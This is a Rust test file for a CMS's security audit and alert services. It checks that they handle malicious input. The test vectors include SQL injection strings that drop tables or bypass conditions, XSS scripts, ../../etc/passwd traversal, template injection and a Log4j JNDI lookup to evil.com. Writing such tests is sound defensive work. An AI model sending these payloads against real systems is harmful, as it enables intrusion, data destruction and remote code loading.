#[cfg(test)]
mod security_audit_security_tests {
    use std::collections::BTreeMap;
    use surrealdb::sql::Value;
    use avored_rust_cms::models::security_audit_model::{
        CreateSecurityAuditModel, SecurityAuditModel, UpdateSecurityAuditModel
    };
    use avored_rust_cms::models::security_alert_model::{
        AlertType, AlertSeverity, CreateSecurityAlertModel
    };
    use avored_rust_cms::services::security_audit_service::{SecurityAuditService, SecurityEventType};
    use avored_rust_cms::services::security_alert_service::SecurityAlertService;
    use avored_rust_cms::repositories::security_audit_repository::SecurityAuditRepository;
    use avored_rust_cms::repositories::security_alert_repository::SecurityAlertRepository;
    use surrealdb::kvs::Datastore;
    use surrealdb::dbs::Session;

    async fn setup_test_db() -> (Datastore, Session) {
        let datastore = Datastore::new("memory").await.unwrap();
        let session = Session::for_db("test", "test");
        (datastore, session)
    }

    async fn setup_audit_service() -> (SecurityAuditService, Datastore, Session) {
        let (datastore, session) = setup_test_db().await;
        let repository = SecurityAuditRepository::new();
        let service = SecurityAuditService::new(repository);
        (service, datastore, session)
    }

    async fn setup_alert_service() -> (SecurityAlertService, Datastore, Session) {
        let (datastore, session) = setup_test_db().await;
        let repository = SecurityAlertRepository::new();
        let service = SecurityAlertService::new(repository);
        (service, datastore, session)
    }

    #[tokio::test]
    async fn test_sql_injection_prevention_in_audit_queries() {
        let (service, datastore, session) = setup_audit_service().await;

        // Test various SQL injection attempts in different fields
        let injection_attempts = vec![
            "'; DROP TABLE security_audit; --",
            "' OR '1'='1",
            "'; INSERT INTO security_audit VALUES ('malicious'); --",
            "' UNION SELECT * FROM admin_users --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ];

        for (i, injection_attempt) in injection_attempts.iter().enumerate() {
            // Test injection in security_audit_id field
            let create_model = CreateSecurityAuditModel {
                security_audit_id: injection_attempt.to_string(),
                admin_user_id: Some(format!("user_{}", i)),
                session_id: Some(format!("session_{}", i)),
                ip_address: "192.168.1.100".to_string(),
                user_agent: Some("Security Test Browser".to_string()),
                endpoint: Some("/api/test".to_string()),
                request_method: Some("POST".to_string()),
                total_authentication_attempts: Some(1),
                failed_authentication_attempts: Some(0),
                blocked_injection_attempts: Some(1), // Mark as injection attempt
                rate_limited_requests: Some(0),
                suspicious_activities_detected: Some(1),
                security_violations: Some(1),
                uptime_seconds: Some(3600),
                security_health_score: Some(50.0), // Lower score due to injection
                metadata: None,
            };

            // The system should handle injection attempts gracefully
            let result = service.create_audit(&datastore, &session, create_model).await;
            assert!(result.is_ok(), "System should handle injection attempt gracefully");

            // Verify the injection attempt was logged but not executed
            let created_audit = result.unwrap();
            assert_eq!(created_audit.security_audit_id, *injection_attempt);
            assert_eq!(created_audit.blocked_injection_attempts, 1);
            assert_eq!(created_audit.security_violations, 1);
        }

        // Test injection in query parameters
        for injection_attempt in &injection_attempts {
            // Test user query with injection attempt
            let user_result = service.get_audits_by_admin_user(
                &datastore, 
                &session, 
                injection_attempt, 
                1, 
                10
            ).await;
            
            // Should not crash or return unauthorized data
            assert!(user_result.is_ok(), "User query should handle injection gracefully");
            
            // Test IP query with injection attempt
            let ip_result = service.get_audits_by_ip_address(
                &datastore, 
                &session, 
                injection_attempt, 
                1, 
                10
            ).await;
            
            assert!(ip_result.is_ok(), "IP query should handle injection gracefully");
        }
    }

    #[tokio::test]
    async fn test_data_sanitization_and_validation() {
        let (service, datastore, session) = setup_audit_service().await;

        // Test various malicious inputs
        let malicious_inputs = vec![
            ("<script>alert('xss')</script>", "XSS attempt"),
            ("javascript:alert('xss')", "JavaScript protocol"),
            ("data:text/html,<script>alert('xss')</script>", "Data URL XSS"),
            ("../../etc/passwd", "Path traversal"),
            ("${jndi:ldap://evil.com/a}", "Log4j injection"),
            ("{{7*7}}", "Template injection"),
            ("\x00\x01\x02", "Null bytes"),
            ("A".repeat(10000), "Extremely long input"),
        ];

        for (malicious_input, description) in malicious_inputs {
            println!("Testing {}: {}", description, malicious_input);

            let create_model = CreateSecurityAuditModel {
                security_audit_id: format!("sanitization_test_{}", description.replace(" ", "_")),
                admin_user_id: Some(malicious_input.to_string()),
                session_id: Some(malicious_input.to_string()),
                ip_address: "192.168.1.200".to_string(),
                user_agent: Some(malicious_input.to_string()),
                endpoint: Some(malicious_input.to_string()),
                request_method: Some("POST".to_string()),
                total_authentication_attempts: Some(1),
                failed_authentication_attempts: Some(0),
                blocked_injection_attempts: Some(1),
                rate_limited_requests: Some(0),
                suspicious_activities_detected: Some(1),
                security_violations: Some(1),
                uptime_seconds: Some(3600),
                security_health_score: Some(30.0),
                metadata: Some({
                    let mut metadata = BTreeMap::new();
                    metadata.insert("malicious_data".to_string(), Value::from(malicious_input));
                    metadata
                }),
            };

            let result = service.create_audit(&datastore, &session, create_model).await;
            assert!(result.is_ok(), "System should handle malicious input: {}", description);

            let audit = result.unwrap();
            
            // Verify data was stored (potentially sanitized) but system remained secure
            assert!(!audit.id.is_empty());
            assert_eq!(audit.blocked_injection_attempts, 1);
            assert_eq!(audit.security_violations, 1);
            
            // Verify metadata was stored securely
            if let Some(metadata) = audit.metadata {
                assert!(metadata.contains_key("malicious_data"));
            }
        }
    }

    #[tokio::test]
    async fn test_access_control_and_authorization() {
        let (service, datastore, session) = setup_audit_service().await;

        // Create audit records for different users
        let users = vec!["user_admin", "user_regular", "user_guest"];
        let mut created_audits = Vec::new();

        for (i, user) in users.iter().enumerate() {
            let create_model = CreateSecurityAuditModel {
                security_audit_id: format!("access_control_test_{}", i),
                admin_user_id: Some(user.to_string()),
                session_id: Some(format!("session_{}", i)),
                ip_address: format!("192.168.2.{}", 100 + i),
                user_agent: Some("Access Control Test Browser".to_string()),
                endpoint: Some(format!("/api/user/{}", user)),
                request_method: Some("GET".to_string()),
                total_authentication_attempts: Some(1),
                failed_authentication_attempts: Some(0),
                blocked_injection_attempts: Some(0),
                rate_limited_requests: Some(0),
                suspicious_activities_detected: Some(0),
                security_violations: Some(0),
                uptime_seconds: Some(3600),
                security_health_score: Some(100.0),
                metadata: Some({
                    let mut metadata = BTreeMap::new();
                    metadata.insert("user_role".to_string(), Value::from(
                        if user.contains("admin") { "admin" } 
                        else if user.contains("regular") { "user" } 
                        else { "guest" }
                    ));
                    metadata
                }),
            };

            let result = service.create_audit(&datastore, &session, create_model).await;
            assert!(result.is_ok());
            created_audits.push(result.unwrap());
        }

        // Test that user-specific queries only return appropriate data
        for user in &users {
            let user_audits = service.get_audits_by_admin_user(
                &datastore, 
                &session, 
                user, 
                1, 
                10
            ).await;
            
            assert!(user_audits.is_ok());
            let audits = user_audits.unwrap();
            
            // Verify all returned audits belong to the requested user
            for audit in &audits.data {
                assert_eq!(audit.admin_user_id.as_ref().unwrap(), user);
            }
        }

        // Test unauthorized access attempts
        let unauthorized_attempts = vec![
            "'; SELECT * FROM security_audit WHERE admin_user_id != 'user_admin'; --",
            "../admin",
            "user_admin' OR '1'='1",
        ];

        for attempt in unauthorized_attempts {
            let result = service.get_audits_by_admin_user(
                &datastore, 
                &session, 
                &attempt, 
                1, 
                10
            ).await;
            
            // Should not crash or return unauthorized data
            assert!(result.is_ok());
            let audits = result.unwrap();
            
            // Should either return empty results or only authorized data
            for audit in &audits.data {
                // Verify no unauthorized data is returned
                assert!(audit.admin_user_id.is_some());
            }
        }
    }

    #[tokio::test]
    async fn test_sensitive_data_protection() {
        let (service, datastore, session) = setup_audit_service().await;

        // Test handling of potentially sensitive data
        let sensitive_data = vec![
            ("password123", "Password"),
            ("4532-1234-5678-9012", "Credit card number"),
            ("123-45-6789", "SSN"),
            ("user@example.com", "Email"),
            ("Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...", "JWT token"),
            ("sk_test_123456789", "API key"),
        ];

        for (sensitive_value, data_type) in sensitive_data {
            let create_model = CreateSecurityAuditModel {
                security_audit_id: format!("sensitive_data_test_{}", data_type.replace(" ", "_")),
                admin_user_id: Some("test_user".to_string()),
                session_id: Some("test_session".to_string()),
                ip_address: "192.168.3.100".to_string(),
                user_agent: Some(format!("Browser with {}", data_type)),
                endpoint: Some("/api/sensitive".to_string()),
                request_method: Some("POST".to_string()),
                total_authentication_attempts: Some(1),
                failed_authentication_attempts: Some(0),
                blocked_injection_attempts: Some(0),
                rate_limited_requests: Some(0),
                suspicious_activities_detected: Some(0),
                security_violations: Some(0),
                uptime_seconds: Some(3600),
                security_health_score: Some(100.0),
                metadata: Some({
                    let mut metadata = BTreeMap::new();
                    metadata.insert("sensitive_field".to_string(), Value::from(sensitive_value));
                    metadata.insert("data_type".to_string(), Value::from(data_type));
                    metadata
                }),
            };

            let result = service.create_audit(&datastore, &session, create_model).await;
            assert!(result.is_ok(), "Should handle sensitive data securely");

            let audit = result.unwrap();
            
            // Verify audit was created
            assert!(!audit.id.is_empty());
            
            // In a real implementation, you might want to verify that sensitive data
            // is properly masked, encrypted, or handled according to security policies
            if let Some(metadata) = &audit.metadata {
                assert!(metadata.contains_key("data_type"));
                // In production, sensitive_field might be masked or encrypted
            }
        }
    }

    #[tokio::test]
    async fn test_rate_limiting_and_dos_protection() {
        let (service, datastore, session) = setup_audit_service().await;

        // Simulate rapid requests from the same IP
        let attacker_ip = "192.168.4.100";
        let rapid_requests = 100;
        let start_time = std::time::Instant::now();

        for i in 0..rapid_requests {
            let create_model = CreateSecurityAuditModel {
                security_audit_id: format!("dos_test_{:03}", i),
                admin_user_id: Some("attacker".to_string()),
                session_id: Some(format!("session_{}", i)),
                ip_address: attacker_ip.to_string(),
                user_agent: Some("DoS Attack Browser".to_string()),
                endpoint: Some("/api/target".to_string()),
                request_method: Some("POST".to_string()),
                total_authentication_attempts: Some(1),
                failed_authentication_attempts: Some(if i > 10 { 1 } else { 0 }),
                blocked_injection_attempts: Some(0),
                rate_limited_requests: Some(if i > 20 { 1 } else { 0 }),
                suspicious_activities_detected: Some(if i > 30 { 1 } else { 0 }),
                security_violations: Some(if i > 40 { 1 } else { 0 }),
                uptime_seconds: Some(3600),
                security_health_score: Some(100.0 - (i as f64 * 2.0).min(90.0)),
                metadata: Some({
                    let mut metadata = BTreeMap::new();
                    metadata.insert("request_sequence".to_string(), Value::from(i as i64));
                    metadata.insert("attack_type".to_string(), Value::from("DoS simulation"));
                    metadata
                }),
            };

            let result = service.create_audit(&datastore, &session, create_model).await;
            assert!(result.is_ok(), "System should handle rapid requests gracefully");
        }

        let total_time = start_time.elapsed();
        println!("Processed {} rapid requests in {:?}", rapid_requests, total_time);

        // Verify the system tracked the suspicious activity
        let ip_summary = service.get_ip_security_summary(&datastore, &session, attacker_ip).await;
        assert!(ip_summary.is_ok());
        
        let summary = ip_summary.unwrap();
        assert_eq!(summary.ip_address, attacker_ip);
        assert_eq!(summary.total_records, rapid_requests as i32);
        assert!(summary.failed_authentication_attempts > 0);
        assert!(summary.rate_limited_requests > 0);
        assert!(summary.suspicious_activities_detected > 0);
        assert!(summary.security_violations > 0);
        assert!(summary.lowest_health_score < 50.0);
    }

    #[tokio::test]
    async fn test_audit_log_integrity() {
        let (service, datastore, session) = setup_audit_service().await;

        // Create an audit record
        let create_model = CreateSecurityAuditModel {
            security_audit_id: "integrity_test_001".to_string(),
            admin_user_id: Some("integrity_user".to_string()),
            session_id: Some("integrity_session".to_string()),
            ip_address: "192.168.5.100".to_string(),
            user_agent: Some("Integrity Test Browser".to_string()),
            endpoint: Some("/api/integrity".to_string()),
            request_method: Some("POST".to_string()),
            total_authentication_attempts: Some(1),
            failed_authentication_attempts: Some(0),
            blocked_injection_attempts: Some(0),
            rate_limited_requests: Some(0),
            suspicious_activities_detected: Some(0),
            security_violations: Some(0),
            uptime_seconds: Some(3600),
            security_health_score: Some(100.0),
            metadata: Some({
                let mut metadata = BTreeMap::new();
                metadata.insert("original_data".to_string(), Value::from("sensitive_operation"));
                metadata
            }),
        };

        let original_audit = service.create_audit(&datastore, &session, create_model).await.unwrap();

        // Attempt to modify the audit record
        let update_model = UpdateSecurityAuditModel {
            total_authentication_attempts: Some(999), // Suspicious modification
            failed_authentication_attempts: Some(0),
            blocked_injection_attempts: Some(0),
            rate_limited_requests: Some(0),
            suspicious_activities_detected: Some(0),
            security_violations: Some(0),
            uptime_seconds: Some(3600),
            security_health_score: Some(100.0),
            metadata: Some({
                let mut metadata = BTreeMap::new();
                metadata.insert("tampered_data".to_string(), Value::from("malicious_modification"));
                metadata
            }),
        };

        let update_result = service.update_audit(&datastore, &session, &original_audit.id, update_model).await;
        
        // In a production system, you might want to:
        // 1. Log all modification attempts
        // 2. Require special authorization for modifications
        // 3. Maintain an audit trail of changes
        // 4. Use cryptographic signatures to ensure integrity
        
        if update_result.is_ok() {
            let updated_audit = update_result.unwrap();
            
            // Verify that the modification was logged/tracked
            assert_eq!(updated_audit.total_authentication_attempts, 999);
            
            // In a real system, you might log this as a security event
            let _ = service.log_security_event(
                &datastore,
                &session,
                Some("system".to_string()),
                None,
                "127.0.0.1".to_string(),
                Some("System Monitor".to_string()),
                Some("/api/audit/modify".to_string()),
                Some("PUT".to_string()),
                SecurityEventType::SecurityViolation,
                Some({
                    let mut metadata = BTreeMap::new();
                    metadata.insert("event".to_string(), Value::from("audit_record_modified"));
                    metadata.insert("audit_id".to_string(), Value::from(original_audit.id.clone()));
                    metadata
                }),
            ).await;
        }
    }

    #[tokio::test]
    async fn test_alert_system_security() {
        let (service, datastore, session) = setup_alert_service().await;

        // Test alert creation with malicious data
        let malicious_inputs = vec![
            "<script>alert('xss')</script>",
            "'; DROP TABLE security_alerts; --",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
        ];

        for (i, malicious_input) in malicious_inputs.iter().enumerate() {
            let create_model = CreateSecurityAlertModel {
                alert_id: format!("security_alert_test_{}", i),
                alert_type: AlertType::InjectionAttempt,
                severity: AlertSeverity::High,
                message: format!("Malicious input detected: {}", malicious_input),
                source: "192.168.6.100".to_string(),
                affected_resource: Some(malicious_input.to_string()),
                metadata: Some({
                    let mut metadata = BTreeMap::new();
                    metadata.insert("malicious_payload".to_string(), Value::from(*malicious_input));
                    metadata
                }),
            };

            let result = service.create_alert(&datastore, &session, create_model).await;
            assert!(result.is_ok(), "Alert system should handle malicious input securely");

            let alert = result.unwrap();
            assert!(!alert.resolved);
            assert!(matches!(alert.alert_type, AlertType::InjectionAttempt));
            assert!(matches!(alert.severity, AlertSeverity::High));
        }

        // Test alert query security
        for malicious_input in &malicious_inputs {
            let alerts_by_source = service.get_alerts_by_source(
                &datastore,
                &session,
                malicious_input,
                1,
                10,
            ).await;

            assert!(alerts_by_source.is_ok(), "Alert queries should handle malicious input securely");
        }
    }
}
